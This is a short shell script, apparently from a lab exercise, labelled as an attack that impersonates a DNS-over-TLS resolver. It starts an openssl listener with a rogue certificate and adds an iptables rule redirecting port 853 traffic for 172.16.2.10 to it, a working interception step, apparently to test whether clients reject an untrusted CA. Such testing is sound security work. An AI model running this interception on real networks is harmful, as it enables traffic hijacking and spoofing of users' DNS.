#!/bin/sh
# Attack (ii): impersonate the resolver on DoT with a ROGUE cert (untrusted CA).
set -eu
echo "[edge-router] starting rogue DoT responder (untrusted cert) on :8853..."
openssl s_server -quiet -accept 8853 \
    -cert /lab/pki/rogue.fullchain.crt -key /lab/pki/rogue.key \
    >/evidence/rogue-sserver.log 2>&1 &
echo $! > /tmp/rogue.pid
sleep 1
iptables -t nat -I PREROUTING -p tcp -d 172.16.2.10 --dport 853 -j REDIRECT --to-ports 8853
echo "[edge-router] REDIRECT 172.16.2.10:853 -> local :8853 (rogue), pid $(cat /tmp/rogue.pid)"
